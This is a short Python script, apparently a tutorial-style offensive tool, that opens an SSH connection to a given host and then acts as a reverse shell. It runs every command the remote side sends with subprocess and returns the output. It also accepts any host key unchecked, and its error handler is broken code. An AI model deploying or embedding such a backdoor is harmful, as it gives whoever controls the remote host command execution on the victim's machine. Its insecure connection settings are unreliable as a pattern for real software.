"""
    Receive command over ssh

USAGE:
    sshRcmd.py [ip:port] [username] [password]

EXAMPLE:
    sshRcmd.py 192.168.2.100:22 yanganto mypassword
"""
import paramiko
import subprocess
import sys


def ssh_reverse_command(addr, user, password, command):
    addr_li = addr.split(':')
    ip = addr_li.pop(0)
    port = int(addr_li[0]) if addr_li else 22
    client = paramiko.SSHClient()
    # client.load_host_keys('/home/yanganto/.ssh/known_hosts')
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port, username=user, password=password)
    ssh_session = client.get_transport().open_session()

    if ssh_session.active:
        ssh_session.send(command)
        print(ssh_session.recv(1024))
        while True:
            command = ssh_session.recv(1024)
            try:
                cmd_output = subprocess.check_output(command.split(b' '))
                ssh_session.send(cmd_output)
            except:
                ssh_session(sys.exc_info())
        client.close()
    return


if __name__ == '__main__':
    if len(sys.argv[1:]) < 3:
        print(__doc__)
        sys.exit(0)
    else:
        ssh_reverse_command(sys.argv[1], sys.argv[2], sys.argv[3], 'ClientConnected')
